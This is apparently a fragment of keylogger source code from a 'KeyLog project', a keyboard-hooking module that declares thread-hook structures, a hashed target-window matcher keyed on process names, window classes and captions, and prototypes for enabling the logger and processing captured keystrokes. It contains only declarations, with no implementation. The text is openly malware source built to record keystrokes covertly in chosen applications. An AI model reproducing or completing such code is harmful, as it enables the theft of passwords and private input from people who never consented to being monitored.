//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KeyLog project. Version 3.0
//	
// module: keyhook.c
// $Revision: 58 $
// $Date: 2014-12-17 17:44:58 +0300 (Ср, 17 дек 2014) $
// description: 
//	Keyboard input hooking engine.


// Specifies a thread for wich a hook routine was set by calling SetWindowsHookEx()
typedef struct _KEY_THREAD
{
#if _DEBUG
	ULONG		Magic;
#endif
	LIST_ENTRY	Entry;		// Global thread list's entry
	HHOOK		hHook;		// Hook routine handle
	ULONG		ThreadId;	// Thread ID
} KEY_THREAD, *PKEY_THREAD;

typedef struct _SPECIAL_WINDOW
{
	ULONG ProcessNameHash;  // process name 
	ULONG WindowNameHash;  // window class name
	ULONG ParentNameHash;  // parent window class name hash
	ULONG Caption;         // window caption hash
	ULONG ParentCaption;   // parent window caption hash
}SPECIAL_WINDOW,*PSPECIAL_WINDOW;

#define KEY_THREAD_MAGIC		'rhTK'
#define	ASSERT_KEY_THREAD(x)	ASSERT(x->Magic == KEY_THREAD_MAGIC)


extern	ULONG				g_HostProcess;
extern	LPTSTR				g_CurrentProcessPath;

VOID KeyLoggerEnable( BOOL bEnable );
BOOL KeyTranslateMessage( IN PMSG pMSG );

BOOL 
	KeyProcessMessage( 
		IN HWND hWnd, 
		IN UINT uMsg, 
		IN UINT VKey, 
		IN UINT ScanCode,
		IN DWORD  ProcessID,
		IN DWORD  ThreadID,
		IN ULONG  HostProcess
#if _DEBUG
		,
		IN LPSTR ProcessPath
#endif
		);
